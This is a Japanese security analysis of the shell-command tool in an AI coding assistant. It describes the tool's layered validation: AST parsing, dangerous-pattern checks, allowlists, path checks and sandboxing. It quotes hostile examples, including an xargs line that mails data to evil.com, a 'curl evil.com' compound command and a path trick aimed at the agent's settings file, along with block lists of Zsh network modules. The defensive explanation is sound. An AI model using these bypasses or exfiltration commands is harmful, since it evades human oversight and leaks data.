# BashTool セキュリティ解析

> Claude Code v2.1.88 ソースコード解析ドキュメント

## 概要

BashToolは Claude Code の中核ツールであり、AIアシスタントがユーザーの代わりにシェルコマンドを実行する機能を提供する。ソースコードの規模は `src/tools/BashTool/` 配下だけで約600KB（18ファイル）に達し、さらに `src/utils/bash/` 配下に15以上の補助モジュールが存在する。この巨大さの主因は、シェルコマンドのセキュリティ検証が極めて複雑であることにある。

### ファイル構成

**`src/tools/BashTool/`（メインモジュール）:**

| ファイル | 役割 |
|---|---|
| `BashTool.tsx` | ツール本体。コマンド実行、権限チェック、結果処理の統合 |
| `bashSecurity.ts` | 危険パターン検出。コマンド置換、リダイレクト、Zsh攻撃の防御 |
| `readOnlyValidation.ts` | 読み取り専用コマンドの許可リストベース検証 |
| `pathValidation.ts` | パス抽出と安全性検証。危険な削除操作の検出 |
| `modeValidation.ts` | パーミッションモードに基づくコマンド制御 |
| `bashPermissions.ts` | パーミッションルールマッチングとワイルドカードパターン |
| `destructiveCommandWarning.ts` | 破壊的コマンドの警告表示（情報提供のみ） |
| `shouldUseSandbox.ts` | サンドボックス使用判定ロジック |
| `sedEditParser.ts` / `sedValidation.ts` | sed コマンド専用のセキュリティ解析 |
| `commandSemantics.ts` | コマンド結果の意味的解釈 |

**`src/utils/bash/`（パーサー・解析基盤）:**

| ファイル | 役割 |
|---|---|
| `ast.ts` | Tree-sitter による AST ベースのコマンド解析 |
| `treeSitterAnalysis.ts` | Tree-sitter AST からのセキュリティ情報抽出 |
| `parser.ts` | Tree-sitter パーサーの低レベルインターフェース |
| `bashParser.ts` | Bash 構文解析ヘルパー |
| `commands.ts` | コマンド分割（`&&`, `||`, `|`, `;` 対応） |
| `shellQuote.ts` / `shellQuoting.ts` | クォート処理と解析 |
| `heredoc.ts` | ヒアドキュメント解析 |
| `ParsedCommand.ts` | パース済みコマンドの構造体 |

---

## コマンド実行のセキュリティモデル

BashTool のセキュリティは「**多層防御（Defense in Depth）**」の原則に基づく。単一の検証レイヤーに依存せず、複数の独立した検証を直列に実行する。

### 検証フロー

```
ユーザー/AIからのコマンド
    |
    v
[1] パーミッションモード判定 (modeValidation.ts)
    |
    v
[2] AST解析 (ast.ts - Tree-sitter)
    |
    v
[3] セキュリティパターン検出 (bashSecurity.ts)
    |
    v
[4] 読み取り専用バリデーション (readOnlyValidation.ts)
    |
    v
[5] パス検証 (pathValidation.ts)
    |
    v
[6] サンドボックス判定 (shouldUseSandbox.ts)
    |
    v
[7] パーミッションルールマッチング (bashPermissions.ts)
    |
    v
[8] 実行 or ユーザー確認
```

---

## Bash AST 解析による安全性検証

### Tree-sitter ベースの解析（`src/utils/bash/ast.ts`）

従来の shell-quote + 正規表現ベースのアプローチを置き換える、AST ベースの構造的解析モジュールである。設計の根幹は「**フェイルクローズド（Fail-Closed）**」原則にある。

```
// ast.ts L1-19 のコメントより:
// The key design property is FAIL-CLOSED: we never interpret structure we
// don't understand. If tree-sitter produces a node we haven't explicitly
// allowlisted, we refuse to extract argv and the caller must ask the user.
```

#### 解析結果の3分類（`ParseForSecurityResult`型）

| 分類 | 意味 | 後続処理 |
|---|---|---|
| `simple` | 安全に argv を抽出できた | パーミッションルールで自動判定可能 |
| `too-complex` | 未知のノード型を含む | ユーザーへの確認プロンプトが必要 |
| `parse-unavailable` | Tree-sitter パーサーが利用不可 | フォールバック検証へ |

#### 許可リスト方式のノード型（`ast.ts` L54-65）

構造ノード（`program`, `list`, `pipeline`, `redirected_statement`）とセパレータ（`&&`, `||`, `|`, `;` 等）のみを許可し、それ以外の未知ノードは即座に `too-complex` として拒否する。

#### 変数参照の安全性追跡

AST 解析では変数スコープを追跡し、コマンド内で代入された変数の参照を安全に解決する（`ast.ts` L76-96）。プレースホルダー文字列（`__CMDSUB_OUTPUT__`, `__TRACKED_VAR__`）を使用し、ランタイムで決定される値を安全にマーキングする。

未クォートの `$VAR` は bash のワード分割（word splitting）とパス名展開（pathname expansion）の対象となるため、スペース・タブ・改行・グロブ文字（`*`, `?`, `[`）を含む変数値は信頼できないものとして扱う（`ast.ts` L99-110 の `BARE_VAR_UNSAFE_RE`）。

### Tree-sitter 解析ユーティリティ（`src/utils/bash/treeSitterAnalysis.ts`）

Tree-sitter の AST から以下のセキュリティ関連情報を抽出する:

- **`QuoteContext`**: クォート除去後のコマンドテキスト（シングルクォート内容除去、全クォート除去、クォート文字保持の3バリアント）
- **`CompoundStructure`**: 複合演算子、パイプライン、サブシェル、コマンドグループの検出
- **`DangerousPatterns`**: コマンド置換 `$()`、プロセス置換 `<()`、パラメータ展開 `${}`、ヒアドキュメント、コメントの検出

クォートスパンの収集は単一パスで実行され（`collectQuoteSpans` 関数、`treeSitterAnalysis.ts` L88-137）、以前の5回の個別ツリー走査を1回に統合してパフォーマンスを約5倍向上させている。

---

## 危険なコマンドの検出と拒否

### bashSecurity.ts のセキュリティチェック

`bashSecurity.ts` は23種類のセキュリティチェック ID を定義している（L77-101 の `BASH_SECURITY_CHECK_IDS`）:

| ID | チェック内容 |
|---|---|
| 1 | 不完全なコマンド |
| 2-3 | jq のシステム関数・ファイル引数 |
| 4 | 難読化されたフラグ |
| 5 | シェルメタ文字 |
| 6 | 危険な変数 |
| 7 | 改行文字 |
| 8-10 | コマンド置換、入力リダイレクト、出力リダイレクト |
| 11 | IFS インジェクション |
| 12 | git commit 内の置換 |
| 13 | /proc/environ アクセス |
| 14 | 不正なトークンインジェクション |
| 15 | バックスラッシュエスケープ空白 |
| 16 | ブレース展開 |
| 17 | 制御文字 |
| 18 | Unicode 空白 |
| 19 | 単語内ハッシュ |
| 20 | Zsh 危険コマンド |
| 21 | バックスラッシュエスケープ演算子 |
| 22 | コメントとクォートの非同期 |
| 23 | クォート内改行 |

### コマンド置換パターンの検出（`bashSecurity.ts` L16-41）

以下のパターンをすべてブロックする:

- **プロセス置換**: `<()`, `>()`, `=()`（Zsh）
- **コマンド置換**: `$()`, `` ` ` ``
- **パラメータ展開**: `${}`, `$[]`
- **Zsh 固有**: `~[` パラメータ展開、`(e:` グロブ修飾子、`(+` グロブ修飾子、`always` ブロック
- **Zsh EQUALS 展開**: `=cmd` が `$(which cmd)` に展開される攻撃ベクタ
- **PowerShell**: `<#` コメント構文（将来の変更に対する多層防御）

### Zsh 危険コマンドの検出（`bashSecurity.ts` L43-74）

`ZSH_DANGEROUS_COMMANDS` セットには以下が含まれる:

- **`zmodload`**: 多くの危険なモジュール（`zsh/mapfile`, `zsh/system`, `zsh/zpty`, `zsh/net/tcp`, `zsh/files`）のロードに使用
- **`emulate`**: `-c` フラグによる eval 相当のコード実行
- **Zsh モジュールビルトイン**: `sysopen`, `sysread`, `syswrite`, `sysseek`, `zpty`, `ztcp`, `zsocket`
- **`zsh/files` モジュールコマンド**: `zf_rm`, `zf_mv`, `zf_ln`, `zf_chmod` 等（バイナリチェックをバイパス）

### クォート内容の抽出と安全なリダイレクション除去

`extractQuotedContent` 関数（`bashSecurity.ts` L128-173）はコマンドからクォートされた文字列を除去し、実際に解釈されるシェル構文のみを検査対象とする。

`stripSafeRedirections`（`bashSecurity.ts` L176-188）は安全なリダイレクション（`2>&1`, `> /dev/null`, `< /dev/null`）を除去するが、**必ず末尾境界（`(?=\s|$)`）を検証する**。これは `> /dev/nullo` のようなパスを `/dev/null` と誤認するプレフィックスマッチ攻撃を防ぐためである。

---

## 読み取り専用バリデーション

### readOnlyValidation.ts

読み取り専用コマンドを自動許可するための統一的な設定システムを提供する（`COMMAND_ALLOWLIST`）。

#### コマンド許可リスト設定（`CommandConfig` 型）

各コマンドエントリは以下を含む:

- **`safeFlags`**: 許可されたフラグとその引数の型（`none`, `number`, `string`, `char`, 特定の文字列）
- **`regex`**: フラグ解析を補完する正規表現バリデーション
- **`additionalCommandIsDangerousCallback`**: カスタム検証ロジック
- **`respectsDoubleDash`**: POSIX `--` オプション終端の尊重有無

#### セキュリティ上の注意点

`xargs` の `-i` と `-e` フラグが明示的に除外されている（`readOnlyValidation.ts` L130-157）。GNU getopt のオプショナル引数セマンティクス（`i::`, `e::`）により、スペース区切りの引数が次の位置引数（実行コマンド）として解釈される攻撃が可能なためである。

```
// readOnlyValidation.ts L139-149 のコメントより:
// `-i` (`i::` -- optional replace-str):
//   echo /usr/sbin/sendm | xargs -it tail a@evil.com
//   GNU: -i replace-str=t, tail -> /usr/sbin/sendmail -> NETWORK EXFIL
```

`fd` / `fdfind` コマンドでは `-x`/`--exec` と `-X`/`--exec-batch` が除外され、`-l`/`--list-details` も除外される（内部で `ls` をサブプロセスとして実行するため、PATH ハイジャックのリスクがある）。

---

## パス検証とサンドボックス制約

### pathValidation.ts

コマンド引数からファイルパスを抽出し、許可されたワーキングディレクトリ内に収まるかを検証する。

#### パス抽出器（`PATH_EXTRACTORS`）

33種類のコマンド（`cd`, `ls`, `find`, `mkdir`, `rm`, `cat`, `grep`, `sed`, `git`, `jq` 等）に対して個別のパス抽出ロジックを持つ（`pathValidation.ts` L190-200）。

#### 危険な削除操作の検出（`checkDangerousRemovalPaths`）

`rm` / `rmdir` コマンドに対して、`isDangerousRemovalPath` を使用してクリティカルなシステムディレクトリへの操作を常にユーザー確認必須とする（`pathValidation.ts` L70-108）。シンボリックリンクを解決せずにパスをチェックする（macOS で `/tmp` が `/private/tmp` へのシンボリックリンクである場合でも検出するため）。

#### POSIX `--` の正しい処理

`filterOutFlags` 関数（`pathValidation.ts` L126-139）は `--` 以降の引数をすべて位置引数として扱う。これにより以下の攻撃を防ぐ:

```
rm -- -/../.claude/settings.local.json
```

ナイーブな `-` プレフィックスチェックでは `-/...` がフラグとして除外され、パス検証がスキップされてしまう。

### shouldUseSandbox.ts

サンドボックスの使用判定は以下の要素を考慮する:

- **`dangerouslyDisableSandbox`** パラメータによる明示的無効化
- **ユーザー設定** (`settings.sandbox.excludedCommands`) による除外コマンド
- **動的設定** (GrowthBook フィーチャーフラグ `tengu_sandbox_disabled_commands`) による除外（ant ユーザーのみ）
- **複合コマンドの分解**: `docker ps && curl evil.com` のような複合コマンドを個別のサブコマンドに分割し、最初のサブコマンドが除外パターンに一致しても残りのサブコマンドを検査する

---

## パーミッションモードとの連携

### modeValidation.ts

パーミッションモードに応じたコマンド制御を提供する（`checkPermissionMode` 関数、`modeValidation.ts` L72-100）:

| モード | 動作 |
|---|---|
| `bypassPermissions` | メインパーミッションフローで処理（パススルー） |
| `dontAsk` | メインパーミッションフローで処理（パススルー） |
| `acceptEdits` | ファイルシステム操作を自動許可 |
| その他 | パススルー（モード固有の処理なし） |

**`acceptEdits` モードで許可されるコマンド**（`modeValidation.ts` L7-15）:
`mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`, `sed`

### 破壊的コマンド警告（`destructiveCommandWarning.ts`）

セキュリティ制御ではなく**情報提供のみ**の機能として、パーミッションダイアログに警告を表示する。検出対象:

- **Git 操作**: `git reset --hard`, `git push --force`, `git clean -f`, `git checkout .`, `git stash drop/clear`, `git branch -D`, `git commit --amend`, `--no-verify`
- **ファイル削除**: `rm -rf`, `rm -r`, `rm -f`
- **データベース**: `DROP TABLE/DATABASE`, `TRUNCATE`, `DELETE FROM`
- **インフラ**: `kubectl delete`, `terraform destroy`

---

## セキュリティ設計の特徴まとめ

1. **フェイルクローズド**: 理解できないコマンド構造はすべてユーザー確認を要求
2. **多層防御**: AST解析、パターンマッチ、パス検証、サンドボックスを独立して適用
3. **クロスシェル対策**: Bash だけでなく Zsh、PowerShell の攻撃ベクタも防御
4. **プレフィックスマッチ攻撃への耐性**: 安全なパスの末尾境界を厳密に検証
5. **GNU getopt セマンティクスの考慮**: オプショナル引数の解釈差異による攻撃を防止
6. **シンボリックリンク非解決**: OS 固有のリンク構造を悪用した攻撃を防止
7. **POSIX `--` の正確な処理**: フラグとパスの誤認を防止
